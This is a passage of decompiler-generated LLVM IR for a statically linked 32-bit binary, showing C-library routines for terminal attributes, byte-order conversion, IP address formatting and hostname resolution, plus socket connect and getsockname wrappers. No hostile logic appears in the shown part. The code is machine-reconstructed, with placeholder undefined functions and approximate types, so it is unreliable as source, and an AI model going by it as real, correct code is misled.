  %v3_8052ffc = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_8053001 = icmp eq i32 %v3_8052ffc, 0
  %v1_8053003 = zext i1 %v1_8053001 to i32
  ret i32 %v1_8053003
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053010 = load i32, i32* @esi, align 4
  %v0_8053011 = load i32, i32* @ebx, align 4
  store i32 %v0_8053011, i32* %stack_var_-8, align 4
  %v2_8053015 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8053015, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_8053027 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_8053015)
  store i32 %v3_8053027, i32* %eax.global-to-local, align 4
  %v1_805302f = icmp eq i32 %v3_8053027, 0
  store i32 %v3_8053027, i32* @esi, align 4
  %v1_8053033 = icmp eq i1 %v1_805302f, false
  br i1 %v1_8053033, label %dec_label_pc_8053078, label %dec_label_pc_8053035

dec_label_pc_8053035:                             ; preds = %entry
  %v3_8053035 = load i32, i32* %stack_var_-44, align 4
  %v1_8053039 = load i32, i32* @ebx, align 4
  %v2_8053039 = inttoptr i32 %v1_8053039 to i32*
  store i32 %v3_8053035, i32* %v2_8053039, align 4
  %v1_805303f = load i32, i32* @ebx, align 4
  %v2_805303f = add i32 %v1_805303f, 4
  %v3_805303f = inttoptr i32 %v2_805303f to i32*
  %v1_8053046 = load i32, i32* @ebx, align 4
  %v2_8053046 = add i32 %v1_8053046, 8
  %v3_8053046 = inttoptr i32 %v2_8053046 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805304d = load i32, i32* @ebx, align 4
  %v2_805304d = add i32 %v1_805304d, 12
  %v3_805304d = inttoptr i32 %v2_805304d to i32*
  store i32 %tmp3, i32* %v3_805304d, align 4
  %v4_8053050 = zext i8 %tmp to i32
  %v5_8053050 = load i32, i32* %eax.global-to-local, align 4
  %v6_8053050 = and i32 %v5_8053050, -256
  %v7_8053050 = or i32 %v6_8053050, %v4_8053050
  store i32 %v7_8053050, i32* %eax.global-to-local, align 4
  %v2_8053054 = load i32, i32* @ebx, align 4
  %v3_8053054 = add i32 %v2_8053054, 16
  %v4_8053054 = inttoptr i32 %v3_8053054 to i8*
  store i8 %tmp, i8* %v4_8053054, align 1
  %v0_8053057 = load i32, i32* %eax.global-to-local, align 4
  %v2_805305a = ptrtoint i32* %stack_var_-27 to i32
  %v0_805305f = load i32, i32* @ebx, align 4
  %v1_805305f = add i32 %v0_805305f, 17
  store i32 %v1_805305f, i32* %eax.global-to-local, align 4
  %v4_8053063 = call i32 @__GI_mempcpy(i32 %v1_805305f, i32 %v2_805305a, i32 19, i32 %v0_8053057)
  store i32 %v4_8053063, i32* %eax.global-to-local, align 4
  %v3_8053070 = inttoptr i32 %v4_8053063 to i8*
  %v4_8053070 = call i32 @__GI_memset(i8* %v3_8053070, i32 0, i32 13)
  store i32 %v4_8053070, i32* %eax.global-to-local, align 4
  %v0_805307b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053078

dec_label_pc_8053078:                             ; preds = %entry, %dec_label_pc_8053035
  %v0_805307b = phi i32 [ %v3_8053027, %entry ], [ %v0_805307b.pre, %dec_label_pc_8053035 ]
  store i32 %v0_805307b, i32* %eax.global-to-local, align 4
  %v2_805307d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805307d, i32* @ebx, align 4
  store i32 %v0_8053010, i32* @esi, align 4
  ret i32 %v0_805307b

; uselistorder directives
  uselistorder i32 %v0_805307b, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053078, { 1, 0 }
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8053085 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8053085 = zext i16 %v3_8053085 to i32
  ret i32 %v4_8053085
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_8053091 = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_8053091
}

define i32 @ntohs(i16 %arg1) local_unnamed_addr {
entry:
  %v3_8053099 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_8053099 = zext i16 %v3_8053099 to i32
  ret i32 %v4_8053099
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80530a5 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_80530a5
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80530a8 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_80530ab = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80530ae = load i32, i32* @ebx, align 4
  store i32 %v0_80530ae, i32* %stack_var_-12, align 4
  %v1_80530b7 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_80530b7, 16777216
  %v1_80530b9 = sdiv i32 %sext, 16777216
  store i32 %v1_80530b9, i32* @ebx, align 4
  %v1_80530bb = add i32 %arg2, 15
  store i32 %v1_80530bb, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530c0

dec_label_pc_80530c0:                             ; preds = %entry, %dec_label_pc_80530e5
  %v0_80530c717 = phi i32 [ %v1_80530b9, %entry ], [ %v2_80530e5, %dec_label_pc_80530e5 ]
  %v0_80530f116 = phi i32 [ %v1_80530bb, %entry ], [ %v0_80530e9, %dec_label_pc_80530e5 ]
  %v1_80530cb = urem i32 %v0_80530c717, 256
  %v5_80530d3 = inttoptr i32 %v0_80530f116 to i8*
  %v6_80530d3 = call i32 @_uintmaxtostr(i8* %v5_80530d3, i32 %v1_80530cb, i32 0, i32 -10, i32 0)
  %v0_80530db = load i32, i32* @esi, align 4
  %v1_80530db = icmp eq i32 %v0_80530db, 0
  %v1_80530dd = add i32 %v6_80530d3, -1
  store i32 %v1_80530dd, i32* %ecx.global-to-local, align 4
  br i1 %v1_80530db, label %dec_label_pc_80530e5, label %dec_label_pc_80530e2

dec_label_pc_80530e2:                             ; preds = %dec_label_pc_80530c0
  %v1_80530e2 = inttoptr i32 %v0_80530db to i8*
  store i8 46, i8* %v1_80530e2, align 1
  %v0_80530e9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530e5

dec_label_pc_80530e5:                             ; preds = %dec_label_pc_80530c0, %dec_label_pc_80530e2
  %v0_80530e9 = phi i32 [ %v1_80530dd, %dec_label_pc_80530c0 ], [ %v0_80530e9.pre, %dec_label_pc_80530e2 ]
  %v0_80530e5 = load i32, i32* @ebx, align 4
  %v2_80530e5 = udiv i32 %v0_80530e5, 256
  store i32 %v2_80530e5, i32* @ebx, align 4
  %v0_80530e8 = load i32, i32* @edi, align 4
  %v1_80530e8 = add i32 %v0_80530e8, 1
  store i32 %v1_80530e8, i32* @edi, align 4
  store i32 %v0_80530e9, i32* @esi, align 4
  %v7_80530ee = icmp sgt i32 %v1_80530e8, 3
  br i1 %v7_80530ee, label %dec_label_pc_80530f0, label %dec_label_pc_80530c0

dec_label_pc_80530f0:                             ; preds = %dec_label_pc_80530e5
  %v2_80530f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80530f0, i32* @ebx, align 4
  %v1_80530f1 = add i32 %v0_80530e9, 1
  store i32 %v0_80530ab, i32* @esi, align 4
  store i32 %v0_80530a8, i32* @edi, align 4
  ret i32 %v1_80530f1

; uselistorder directives
  uselistorder i32 %v0_80530e9, { 0, 2, 1 }
  uselistorder i32 %v1_80530b9, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80530e5, { 1, 0 }
  uselistorder label %dec_label_pc_80530c0, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8053103 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_8062564.494 to i32))
  ret i32 %v2_8053103
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805310f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8053118 = inttoptr i32 %arg1 to i8*
  %v3_8053118 = call i32 @inet_aton(i8* %v2_8053118, i32 %v2_805310f)
  %v1_8053123 = icmp eq i32 %v3_8053118, 0
  br i1 %v1_8053123, label %dec_label_pc_805312b, label %dec_label_pc_8053127

dec_label_pc_8053127:                             ; preds = %entry
  %v3_8053127 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805312b

dec_label_pc_805312b:                             ; preds = %entry, %dec_label_pc_8053127
  %v0_805312b = phi i32 [ -1, %entry ], [ %v3_8053127, %dec_label_pc_8053127 ]
  ret i32 %v0_805312b

; uselistorder directives
  uselistorder label %dec_label_pc_805312b, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053137 = call i32 @__GI___h_errno_location()
  %v0_805313c = load i32, i32* @edx, align 4
  %v2_805313f = ptrtoint i32* %stack_var_-4 to i32
  %v9_8053157 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_806274c.496, i32 ptrtoint (i32* @global_var_8062580.495 to i32), i32 460, i32 %v2_805313f, i32 %v0_8053137, i32 %v0_805313c, i32 %v0_805313c)
  %v3_805315c = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805315c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8053164 = load i32, i32* @ebp, align 4
  %v0_8053165 = load i32, i32* @edi, align 4
  %v0_8053166 = load i32, i32* @esi, align 4
  %v0_8053167 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8053177 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8053177, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8053182 = icmp eq i32 %arg1, 0
  br i1 %v4_8053182, label %dec_label_pc_805348e, label %dec_label_pc_805318d

dec_label_pc_805318d:                             ; preds = %entry
  %v1_805318d = call i32 @__errno_location(i32 %v0_8053167)
  store i32 %v1_805318d, i32* %eax.global-to-local, align 4
  %v1_8053192 = inttoptr i32 %v1_805318d to i32*
  %v2_8053192 = load i32, i32* %v1_8053192, align 4
  store i32 %v2_8053192, i32* @edi, align 4
  store i32 %v1_805318d, i32* @esi, align 4
  store i32 0, i32* %v1_8053192, align 4
  %v0_80531a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80531a5, i32* %stack_var_-108, align 4
  %v7_80531b1 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_80531a5, i32 %arg5, i32 %arg6, i32 %v1_805318d)
  store i32 %v7_80531b1, i32* %eax.global-to-local, align 4
  %v1_80531b9 = icmp eq i32 %v7_80531b1, 0
  br i1 %v1_80531b9, label %dec_label_pc_805348e, label %dec_label_pc_80531c1

dec_label_pc_80531c1:                             ; preds = %dec_label_pc_805318d
  %v1_80531c5 = inttoptr i32 %arg6 to i32*
  %v2_80531c5 = load i32, i32* %v1_80531c5, align 4
  store i32 %v2_80531c5, i32* %edx.global-to-local, align 4
  %v9_80531c7 = icmp eq i32 %v2_80531c5, 1
  br i1 %v9_80531c7, label %dec_label_pc_80531e1, label %dec_label_pc_80531cc

dec_label_pc_80531cc:                             ; preds = %dec_label_pc_80531c1
  %v9_80531cc = icmp eq i32 %v2_80531c5, 4
  br i1 %v9_80531cc, label %dec_label_pc_80531e1, label %dec_label_pc_80531d1

dec_label_pc_80531d1:                             ; preds = %dec_label_pc_80531cc
  %v1_80531d1 = add i32 %v2_80531c5, 1
  %v8_80531d1 = icmp eq i32 %v1_80531d1, 0
  store i32 %v1_80531d1, i32* %edx.global-to-local, align 4
  %v1_80531d2 = icmp eq i1 %v8_80531d1, false
  br i1 %v1_80531d2, label %dec_label_pc_805348e, label %dec_label_pc_80531d8

dec_label_pc_80531d8:                             ; preds = %dec_label_pc_80531d1
  %v0_80531d8 = load i32, i32* @esi, align 4
  %v1_80531d8 = inttoptr i32 %v0_80531d8 to i32*
  %v2_80531d8 = load i32, i32* %v1_80531d8, align 4
  %v11_80531d8 = icmp eq i32 %v2_80531d8, 2
  %v1_80531db = icmp eq i1 %v11_80531d8, false
  br i1 %v1_80531db, label %dec_label_pc_805348e, label %dec_label_pc_80531e1

dec_label_pc_80531e1:                             ; preds = %dec_label_pc_80531d8, %dec_label_pc_80531cc, %dec_label_pc_80531c1
  %v0_80531e1 = load i32, i32* @ebp, align 4
  %v1_80531e3 = sub i32 0, %v0_80531e1
  %v1_80531e5 = urem i32 %v1_80531e3, 4
  %v2_80531e5 = icmp eq i32 %v1_80531e5, 0
  store i32 %v1_80531e5, i32* %eax.global-to-local, align 4
  %v0_80531e8 = load i32, i32* @edi, align 4
  %v1_80531e8 = load i32, i32* @esi, align 4
  %v2_80531e8 = inttoptr i32 %v1_80531e8 to i32*
  store i32 %v0_80531e8, i32* %v2_80531e8, align 4
  %v0_80531fc.pre = load i32, i32* @ebx, align 4
  br i1 %v2_80531e5, label %dec_label_pc_80531f8, label %dec_label_pc_80531ec

dec_label_pc_80531ec:                             ; preds = %dec_label_pc_80531e1
  %v1_80531ec = load i32, i32* %eax.global-to-local, align 4
  %v2_80531ec = sub i32 %v0_80531fc.pre, %v1_80531ec
  %v7_80531ec = icmp ult i32 %v0_80531fc.pre, %v1_80531ec
  br i1 %v7_80531ec, label %dec_label_pc_8053489, label %dec_label_pc_80531f4

dec_label_pc_80531f4:                             ; preds = %dec_label_pc_80531ec
  %v0_80531f4 = load i32, i32* @ebp, align 4
  %v2_80531f4 = add i32 %v0_80531f4, %v1_80531ec
  store i32 %v2_80531f4, i32* @ebp, align 4
  store i32 %v2_80531ec, i32* @ebx, align 4
  br label %dec_label_pc_80531f8

dec_label_pc_80531f8:                             ; preds = %dec_label_pc_80531e1, %dec_label_pc_80531f4
  %v0_80531fc = phi i32 [ %v2_80531ec, %dec_label_pc_80531f4 ], [ %v0_80531fc.pre, %dec_label_pc_80531e1 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80531c5, align 4
  %tmp41 = icmp ult i32 %v0_80531fc, 4
  br i1 %tmp41, label %dec_label_pc_8053489, label %dec_label_pc_805320b

dec_label_pc_805320b:                             ; preds = %dec_label_pc_80531f8
  %v0_805320b = load i32, i32* @ebx, align 4
  %v1_805320b = add i32 %v0_805320b, -4
  store i32 %v1_805320b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805320b, 8
  br i1 %tmp42, label %dec_label_pc_8053489, label %dec_label_pc_8053217

dec_label_pc_8053217:                             ; preds = %dec_label_pc_805320b
  %v1_8053217 = add i32 %v0_805320b, -12
  store i32 %v1_8053217, i32* %eax.global-to-local, align 4
  %v0_805321a = load i32, i32* @ebp, align 4
  %v1_805321a = add i32 %v0_805321a, 4
  store i32 %v1_805321a, i32* %edx.global-to-local, align 4
  store i32 %v1_805321a, i32* %stack_var_-92, align 4
  %v3_8053223 = inttoptr i32 %v1_805321a to i32*
  store i32 %v0_805321a, i32* %v3_8053223, align 4
  %v0_8053226 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053226 = add i32 %v0_8053226, 4
  %v2_8053226 = inttoptr i32 %v1_8053226 to i32*
  store i32 0, i32* %v2_8053226, align 4
  %tmp43 = icmp ult i32 %v1_8053217, 32
  br i1 %tmp43, label %dec_label_pc_8053489, label %dec_label_pc_8053233

dec_label_pc_8053233:                             ; preds = %dec_label_pc_8053217
  %v0_8053233 = load i32, i32* @ebx, align 4
  %v1_8053233 = add i32 %v0_8053233, -44
  store i32 %v1_8053233, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8053233, 256
  br i1 %tmp44, label %dec_label_pc_8053489, label %dec_label_pc_8053246

dec_label_pc_8053246:                             ; preds = %dec_label_pc_8053233
  %v0_8053246 = load i32, i32* @ebp, align 4
  %v1_8053246 = add i32 %v0_8053246, 12
  %v1_805324d = add i32 %v0_8053246, 44
  store i32 %v1_805324d, i32* @edi, align 4
  store i32 %v1_805324d, i32* %stack_var_-108, align 4
  %v3_805325a = inttoptr i32 %v1_805324d to i8*
  %v4_805325a = call i32 @strncpy(i8* %v3_805325a, i32 %arg1, i32 %v1_8053233)
  %v0_805325f = load i32, i32* @edi, align 4
  %v1_805325f = load i32, i32* @ebp, align 4
  %v2_805325f = add i32 %v1_805325f, 12
  %v3_805325f = inttoptr i32 %v2_805325f to i32*
  store i32 %v0_805325f, i32* %v3_805325f, align 4
  %v1_8053266 = add i32 %v0_8053246, 16
  %v2_8053266 = inttoptr i32 %v1_8053266 to i32*
  store i32 0, i32* %v2_8053266, align 4
  %v2_805326d = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805326d, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805326f = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8053274 = inttoptr i32 %arg1 to i8*
  %v3_8053274 = call i32 @inet_aton(i8* %v2_8053274, i32 %v0_805326f)
  store i32 %v3_8053274, i32* %eax.global-to-local, align 4
  %v1_805327c = icmp eq i32 %v3_8053274, 0
  br i1 %v1_805327c, label %dec_label_pc_80532b8, label %dec_label_pc_8053280

dec_label_pc_8053280:                             ; preds = %dec_label_pc_8053246
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8053284 = load i32, i32* @edi, align 4
  store i32 %v0_8053284, i32* %arg2, align 4
  %v1_8053286 = add i32 %tmp18, 8
  %v2_8053286 = inttoptr i32 %v1_8053286 to i32*
  store i32 2, i32* %v2_8053286, align 4
  %v0_805328d = load i32, i32* %edx.global-to-local, align 4
  %v1_805328d = add i32 %v0_805328d, 12
  %v2_805328d = inttoptr i32 %v1_805328d to i32*
  store i32 4, i32* %v2_805328d, align 4
  %v2_8053294 = load i32, i32* %stack_var_-92, align 4
  %v1_8053297 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053297 = add i32 %v1_8053297, 16
  %v3_8053297 = inttoptr i32 %v2_8053297 to i32*
  store i32 %v2_8053294, i32* %v3_8053297, align 4
  %v1_805329e = load i32, i32* %edx.global-to-local, align 4
  %v2_805329e = add i32 %v1_805329e, 4
  %v3_805329e = inttoptr i32 %v2_805329e to i32*
  store i32 %v1_8053246, i32* %v3_805329e, align 4
  %v0_80532a5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80532a5, i32* %v1_8053177, align 4
  store i32 0, i32* %v1_80531c5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805348e

dec_label_pc_80532b8:                             ; preds = %dec_label_pc_8053246
  %v0_80532b8 = call i32 @__open_nameservers()
  store i32 %v0_80532b8, i32* @eax, align 4
  %v2_80532c8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80532c8, i32* @ebx, align 4
  store i32 %v2_80532c8, i32* %stack_var_-108, align 4
  %v2_80532cd = call i32 @__pthread_return_void(i32 %v2_80532c8, i32 134566343)
  store i32 %v2_80532cd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* %stack_var_-108, align 4
  %v1_80532d9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c4e8.497 to i32))
  %v0_80532de = load i32, i32* @global_var_8062bd4.498, align 4
  store i32 %v0_80532de, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805c4e8.497 to i32), i32* @ecx, align 4
  store i32 134566343, i32* @eax, align 4
  store i32 %v2_80532c8, i32* %stack_var_-108, align 4
  %v2_80532e9 = call i32 @__pthread_return_void(i32 %v2_80532c8, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8053304 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8053309 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053309, i32* %eax.global-to-local, align 4
  store i32 %v2_8053309, i32* %stack_var_-108, align 4
  %v0_8053313 = load i32, i32* @esi, align 4
  %v7_805331a = call i32 @__dns_lookup(i8* %v2_8053274, i32 1, i32 %v0_8053313, i32 ptrtoint (i32* @global_var_8062bc8.499 to i32), i32 %v2_8053309, i32 %v2_8053304)
  store i32 %v7_805331a, i32* %eax.global-to-local, align 4
  %v2_8053322 = icmp slt i32 %v7_805331a, 0
  %v1_8053324 = icmp eq i1 %v2_8053322, false
  br i1 %v1_8053324, label %dec_label_pc_805333a, label %dec_label_pc_8053326

dec_label_pc_8053326:                             ; preds = %dec_label_pc_80532b8
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80531c5, align 4
  br label %dec_label_pc_805348e

dec_label_pc_805333a:                             ; preds = %dec_label_pc_80532b8
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805334d = icmp ugt i32 %v1_8053233, 256
  %v15_805334d = icmp eq i32 %v0_8053233, 300
  %v2_8053351 = or i1 %v10_805334d, %v15_805334d
  br i1 %v2_8053351, label %dec_label_pc_80533ec, label %dec_label_pc_8053353

dec_label_pc_8053353:                             ; preds = %dec_label_pc_805333a
  %v3_8053356 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053356, i32* %stack_var_-108, align 4
  %v1_805335a = call i32 @free(i32 %v3_8053356)
  store i32 %v1_805335a, i32* %eax.global-to-local, align 4
  store i32 %v3_8053356, i32* @edi, align 4
  %v3_8053360 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053360, i32* %stack_var_-108, align 4
  %v1_8053364 = call i32 @free(i32 %v3_8053360)
  store i32 -1, i32* %v1_80531c5, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053464

dec_label_pc_80533ec:                             ; preds = %dec_label_pc_805333a
  %v3_80533f1.pre = load i32, i32* %stack_var_-76, align 4
  %v0_80533f5.pre = load i32, i32* @edi, align 4
  store i32 %v0_80533f5.pre, i32* %stack_var_-108, align 4
  %v3_80533f6 = inttoptr i32 %v0_80533f5.pre to i8*
  %v4_80533f6 = call i32 @strncpy(i8* %v3_80533f6, i32 %v3_80533f1.pre, i32 %v1_8053233)
  store i32 %v4_80533f6, i32* %eax.global-to-local, align 4
  %v3_80533fc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_80533fc, i32* %stack_var_-108, align 4
  %v1_8053400 = call i32 @free(i32 %v3_80533fc)
  store i32 %v1_8053400, i32* %eax.global-to-local, align 4
  %v12_8053408 = icmp eq i32 %tmp10, 1
  %v1_805340d = icmp eq i1 %v12_8053408, false
  br i1 %v1_805340d, label %dec_label_pc_8053469, label %dec_label_pc_805340f

dec_label_pc_805340f:                             ; preds = %dec_label_pc_80533ec
  %v0_805340f = load i32, i32* @edx, align 4
  %v0_8053416 = load i32, i32* @ebp, align 4
  store i32 %v0_8053416, i32* %stack_var_-108, align 4
  %v3_8053417 = inttoptr i32 %tmp to i16*
  %v4_8053417 = call i32 @memcpy(i16* %v3_8053417, i32 4, i32 %v0_805340f)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8053420 = load i32, i32* @edi, align 4
  store i32 %v0_8053420, i32* %arg2, align 4
  %v1_8053422 = add i32 %tmp18, 8
  %v2_8053422 = inttoptr i32 %v1_8053422 to i32*
  store i32 2, i32* %v2_8053422, align 4
  %v0_8053429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053429 = add i32 %v0_8053429, 12
  %v2_8053429 = inttoptr i32 %v1_8053429 to i32*
  store i32 4, i32* %v2_8053429, align 4
  %v3_8053430 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8053430, i32* %edx.global-to-local, align 4
  %v1_8053434 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053434 = add i32 %v1_8053434, 16
  %v3_8053434 = inttoptr i32 %v2_8053434 to i32*
  store i32 %v3_8053430, i32* %v3_8053434, align 4
  %v1_805343b = load i32, i32* %eax.global-to-local, align 4
  %v2_805343b = add i32 %v1_805343b, 4
  %v3_805343b = inttoptr i32 %v2_805343b to i32*
  store i32 %v1_8053246, i32* %v3_805343b, align 4
  %v2_805343e = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805343e, i32* %eax.global-to-local, align 4
  %v3_805343f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805343f, i32* %stack_var_-108, align 4
  %v1_8053443 = call i32 @free(i32 %v3_805343f)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8053177, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_80531c5, align 4
  br label %dec_label_pc_8053464

dec_label_pc_8053464:                             ; preds = %dec_label_pc_8053469, %dec_label_pc_8053353, %dec_label_pc_805340f
  br label %dec_label_pc_805348e

dec_label_pc_8053469:                             ; preds = %dec_label_pc_80533ec
  %v3_805346c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805346c, i32* %stack_var_-108, align 4
  %v1_8053470 = call i32 @free(i32 %v3_805346c)
  store i32 1, i32* %v1_80531c5, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053464

dec_label_pc_8053489:                             ; preds = %dec_label_pc_8053233, %dec_label_pc_8053217, %dec_label_pc_805320b, %dec_label_pc_80531f8, %dec_label_pc_80531ec
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805348e

dec_label_pc_805348e:                             ; preds = %dec_label_pc_80531d8, %dec_label_pc_80531d1, %dec_label_pc_805318d, %entry, %dec_label_pc_8053464, %dec_label_pc_8053326, %dec_label_pc_8053280, %dec_label_pc_8053489
  store i32 %v0_8053167, i32* @ebx, align 4
  store i32 %v0_8053166, i32* @esi, align 4
  store i32 %v0_8053165, i32* @edi, align 4
  store i32 %v0_8053164, i32* @ebp, align 4
  %v0_8053495 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053495

; uselistorder directives
  uselistorder i32 %v2_80532c8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_805324d, { 1, 0, 2 }
  uselistorder i32 %v1_8053246, { 1, 0 }
  uselistorder i32 %v1_8053233, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80531fc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_80531e5, { 1, 0 }
  uselistorder i32 %v2_80531c5, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80531c5, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8053177, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805348e, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053464, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80531f8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80534b3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80534ba = call i32 @__socketcall(i32 3, i32 %v2_80534b3)
  ret i32 %v2_80534ba

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80534df = ptrtoint i32* %stack_var_-12 to i32
  %v2_80534e6 = call i32 @__socketcall(i32 6, i32 %v2_80534df)
  ret i32 %v2_80534e6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
